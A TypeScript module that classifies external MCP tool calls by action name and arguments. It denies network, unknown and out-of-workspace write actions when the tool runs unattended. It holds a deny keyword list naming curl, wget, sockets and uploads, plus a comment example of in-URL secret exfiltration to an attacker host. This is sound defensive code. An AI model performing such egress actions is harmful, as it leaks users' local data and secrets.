/**
 * The MCP-containment rule family (`mcp-uncontained` rule id): the bypass-mode
 * fallback for external `mcp__*` tools the native-name gates never inspect. A
 * write-capable MCP tool is confined by its path argument; a network-capable one is
 * denied outright; an UNKNOWN action fails closed. The full rationale (why
 * fail-closed under bypass, where `canUseTool` never fires) is documented at the
 * facade head. Extracted from `workspace-confinement.ts`; the orchestrator that
 * dispatches to it stays in that facade.
 */
import * as path from 'node:path';

import type { ToolDenyVerdict } from '../tool-deny-policy.js';
import {
  confinementReason,
  isAllowedTarget,
  resolveAgainst,
} from './paths.js';
import { WORKSPACE_CONFINEMENT_RULE_ID } from './workspace.js';

/** Stable id surfaced when the MCP fallback refuses an uncontained mutation or a
 *  network egress by an external `mcp__*` tool (distinct from the native-tool
 *  `workspace-confinement` id so telemetry can tell the two apart). */
export const MCP_CONTAINMENT_RULE_ID = 'mcp-uncontained';

/** The action segment of an `mcp__<server>__<action>` tool name (everything after
 *  the final `__`), lowercased. Keying off the ACTION — not the whole name —
 *  avoids classifying a tool by its SERVER name (`mcp__http_server__list_files`
 *  is a list, not a network call). */
function mcpAction(toolName: string): string {
  const idx = toolName.lastIndexOf('__');
  return (idx === -1 ? toolName : toolName.slice(idx + 2)).toLowerCase();
}

/** Action-name substrings that denote a NETWORK/egress capability — a channel
 *  that could ship local data off the machine. Egress can't be contained by a
 *  path check, so a match is denied outright under bypass (fail-closed). */
const MCP_NETWORK_KEYWORDS: readonly string[] = [
  'http',
  'fetch',
  'request',
  'curl',
  'wget',
  'url',
  'uri',
  'webhook',
  'upload',
  'download',
  'browse',
  'navigate',
  'socket',
  'email',
  'mail',
  'send',
  'publish',
  'post',
];

/** Action-name substrings that denote a file-WRITE capability — contained by its
 *  path argument (allowed inside cwd, denied outside; denied fail-closed when no
 *  path argument can be found, since an uncontained mutation can't be verified). */
const MCP_WRITE_KEYWORDS: readonly string[] = [
  'write',
  'create',
  'edit',
  'save',
  'put',
  'append',
  'delete',
  'remove',
  'move',
  'rename',
  'copy',
  'mkdir',
  'patch',
  'update',
  'insert',
  'replace',
  'touch',
  'chmod',
];

/** Action-name substrings that POSITIVELY denote a benign read/query/inspection —
 *  the only class allowed to fall through under bypass. An action matching none of
 *  network/write/read is UNKNOWN and fails closed (denied), symmetric to the
 *  fail-closed unknown-mutation branch: under bypass `canUseTool` (which would mark
 *  an unknown `mcp__*` tool dangerous and prompt) never fires, so an
 *  unconventionally-named tool like `mcp__x__sync`/`__process` must not slip
 *  through as "other → allowed". */
const MCP_READ_KEYWORDS: readonly string[] = [
  'read',
  'get',
  'list',
  'search',
  'query',
  'find',
  'show',
  'describe',
  'inspect',
  'view',
  'lookup',
  'resolve',
  'count',
  'exists',
  'info',
  'status',
  'stat',
  'head',
  'tail',
  'grep',
  'glob',
  'walk',
  'tree',
  'diff',
  'history',
  'print',
  'version',
  'schema',
  'summar',
  'analy',
  'detail',
  'enumerate',
  'select',
];

/** True when an action name POSITIVELY reads as a read/query — a whitespace/`_`/`-`
 *  token that STARTS WITH a read verb (`get_file` → `get`, `db_query` → `query`,
 *  glued `listresources` → `list`). Token-prefix (not raw substring) so an
 *  unrelated name that merely CONTAINS a short verb — `frobni`+`cat`+`e`,
 *  `alloCATE` — is NOT mistaken for a read and stays `other` (fail-closed). */
function actionLooksReadOnly(action: string): boolean {
  const tokens = action.split(/[^a-z0-9]+/).filter((t) => t.length > 0);
  return tokens.some((t) => MCP_READ_KEYWORDS.some((k) => t.startsWith(k)));
}

/** A string carrying a URL scheme (`https://`, `s3://`, `file://`, `gopher://`).
 *  Shared by {@link extractMcpPaths} (a URL is not a filesystem target, so it is
 *  excluded from path containment) and {@link hasUrlArgument} (a URL-valued
 *  argument is an egress channel, so it forces a network classification). */
const URL_SCHEME_PATTERN = /^[a-z][a-z0-9+.-]*:\/\//i;

/** Recursion cap for {@link hasUrlArgument}. Real MCP inputs nest a URL only a
 *  couple of levels deep (`{request:{url}}`, `{targets:[…]}`); the depth cap is
 *  the primary guard against pathological or cyclic inputs stalling the
 *  single-process sidecar (a cycle re-descends until the cap stops it). */
const MCP_URL_SCAN_MAX_DEPTH = 5;

/** Total values {@link hasUrlArgument} will inspect — a second guard (with the
 *  depth cap) bounding a huge/adversarial fan-out payload. A URL beyond the
 *  budget fails open, acceptable for a heuristic gate (write/other still fail
 *  CLOSED, and the OS sandbox remains the hard line). */
const MCP_URL_SCAN_MAX_NODES = 1000;

/** True when any string REACHABLE in the tool input carries a URL scheme. A URL
 *  argument is an off-machine egress channel even under a benign read verb
 *  (`mcp__x__get`/`__search`/`__resolve` with `url: https://attacker/?<secret>`),
 *  so a URL-bearing call is treated as `network` — and denied under bypass —
 *  rather than allowed to fall through the read allowlist (fail-closed default;
 *  #222). Recurses (bounded by {@link MCP_URL_SCAN_MAX_DEPTH} /
 *  {@link MCP_URL_SCAN_MAX_NODES}) into nested objects AND array elements, since
 *  real MCP servers carry the URL nested — `{request:{url}}`, `{urls:[…]}`,
 *  `params.url` — far more often than as a bare top-level string. Uses the SAME
 *  URL-scheme shape the path extractor already excludes.
 *
 *  NOTE: scheme-less URLs (`//host`, `host:443`, bare `www.example.com`) are
 *  INTENTIONALLY not promoted — matching them would over-promote ordinary
 *  hostnames, ports, and relative paths; that gap is a documented residual, out
 *  of scope here (the hard containment line remains the OS sandbox). */
function hasUrlArgument(toolInput: unknown): boolean {
  let budget = MCP_URL_SCAN_MAX_NODES;
  const visit = (value: unknown, depth: number): boolean => {
    if (budget <= 0 || depth > MCP_URL_SCAN_MAX_DEPTH) return false;
    budget -= 1;
    if (typeof value === 'string') return URL_SCHEME_PATTERN.test(value);
    if (Array.isArray(value)) {
      for (const item of value) {
        if (visit(item, depth + 1)) return true;
      }
      return false;
    }
    if (value !== null && typeof value === 'object') {
      for (const nested of Object.values(value as Record<string, unknown>)) {
        if (visit(nested, depth + 1)) return true;
      }
    }
    return false;
  };
  return visit(toolInput, 0);
}

/** Classify an external MCP tool by its action name AND its input. `network` and
 *  `write` are the two uncontained-by-default capabilities the native-name gates
 *  never see; `read` is the positively-recognized benign class allowed to fall
 *  through; everything else is `other` (UNKNOWN → fail-closed at the caller).
 *  Network is checked first (a `put_url`/`upload` reads as egress), then write (a
 *  mutation verb); a call carrying a URL-valued ARGUMENT is then promoted to
 *  `network` too — an in-URL-GET exfil under a read verb (`get`/`search`/`query`/
 *  `resolve`/…) must not slip through the read allowlist (#222) — and only after
 *  that does the read allowlist decide. */
function classifyMcpTool(
  toolName: string,
  toolInput: unknown,
): 'network' | 'write' | 'read' | 'other' {
  const action = mcpAction(toolName);
  if (MCP_NETWORK_KEYWORDS.some((k) => action.includes(k))) return 'network';
  if (MCP_WRITE_KEYWORDS.some((k) => action.includes(k))) return 'write';
  // A URL-valued argument is an egress channel regardless of the action verb, so
  // promote to `network` (denied under bypass) BEFORE the read-verb allowlist can
  // win — closes the in-URL-GET exfil hole under a `get`/`search`/`resolve` name.
  if (hasUrlArgument(toolInput)) return 'network';
  if (actionLooksReadOnly(action)) return 'read';
  return 'other';
}

/** Input keys that conventionally carry a filesystem destination. */
const MCP_PATH_KEYS: ReadonlySet<string> = new Set([
  'path',
  'file_path',
  'filepath',
  'file',
  'target',
  'dest',
  'destination',
  'output',
  'out',
  'filename',
  'to',
  'location',
  'dir',
  'directory',
]);

/** Best-effort extraction of filesystem-path arguments from an unknown MCP tool
 *  input: a string value under a conventional path key, or any string that looks
 *  like a local path (absolute / `./` / `../` / `~`). URL-scheme strings
 *  (`https://…`) are excluded — they are not filesystem targets. */
function extractMcpPaths(toolInput: unknown): string[] {
  if (toolInput === null || typeof toolInput !== 'object') return [];
  const paths: string[] = [];
  for (const [key, value] of Object.entries(toolInput as Record<string, unknown>)) {
    if (typeof value !== 'string' || value.length === 0) continue;
    if (URL_SCHEME_PATTERN.test(value)) continue; // a URL, not a path
    const looksLikePath =
      MCP_PATH_KEYS.has(key.toLowerCase()) ||
      path.isAbsolute(value) ||
      value.startsWith('./') ||
      value.startsWith('../') ||
      value.startsWith('~');
    if (looksLikePath) paths.push(value);
  }
  return paths;
}

/** The reason surfaced when the MCP fallback refuses a network/uncontained-write
 *  external tool call under bypass (no `canUseTool` prompt fires there). */
function mcpContainmentReason(toolName: string, cwd: string, detail: string): string {
  return (
    `Blocked by Nightcore MCP containment: the external tool ${toolName} ${detail}, ` +
    `so it is refused under the studio's unattended (bypass) mode where no approval ` +
    `prompt fires. This task's working directory is ${cwd}; run this server's ` +
    `write/network tools in an attended session, or scope the write to a path inside ` +
    `the working directory.`
  );
}

/**
 * The bypass-mode fallback for external `mcp__*` tools, which the native-name
 * gates above never inspect: a write-capable MCP tool is confined by its path
 * argument (denied outside cwd, denied fail-closed when no path is present — an
 * uncontained mutation can't be verified), and a network-capable one is denied
 * outright (egress can't be contained by a path check). Only a POSITIVELY
 * read/query-classified action falls through to allow; an UNKNOWN action (matching
 * no capability keyword) fails CLOSED (denied), symmetric to the uncontained-write
 * branch — under bypass no `canUseTool` prompt fires to catch it, so an
 * unconventionally-named write/egress tool must not slip through as "benign".
 */
export function evaluateMcpContainment(
  toolName: string,
  toolInput: unknown,
  resolvedCwd: string,
  roots: readonly string[],
): ToolDenyVerdict {
  const kind = classifyMcpTool(toolName, toolInput);
  if (kind === 'other') {
    return {
      denied: true,
      ruleId: MCP_CONTAINMENT_RULE_ID,
      reason: mcpContainmentReason(
        toolName,
        resolvedCwd,
        'could not be positively classified as a read-only/query tool, so under ' +
          'the studio’s unattended (bypass) mode it is refused rather than ' +
          'run unconfined',
      ),
    };
  }
  if (kind === 'network') {
    return {
      denied: true,
      ruleId: MCP_CONTAINMENT_RULE_ID,
      reason: mcpContainmentReason(
        toolName,
        resolvedCwd,
        'looks like a network/egress tool that could exfiltrate local data',
      ),
    };
  }
  if (kind === 'write') {
    const paths = extractMcpPaths(toolInput);
    if (paths.length === 0) {
      return {
        denied: true,
        ruleId: MCP_CONTAINMENT_RULE_ID,
        reason: mcpContainmentReason(
          toolName,
          resolvedCwd,
          'looks like a file-mutating tool but exposes no inspectable path argument',
        ),
      };
    }
    for (const p of paths) {
      const resolved = resolveAgainst(resolvedCwd, p);
      if (!isAllowedTarget(resolved, roots)) {
        return {
          denied: true,
          ruleId: WORKSPACE_CONFINEMENT_RULE_ID,
          reason: confinementReason(resolved, resolvedCwd),
        };
      }
    }
  }
  return { denied: false };
}
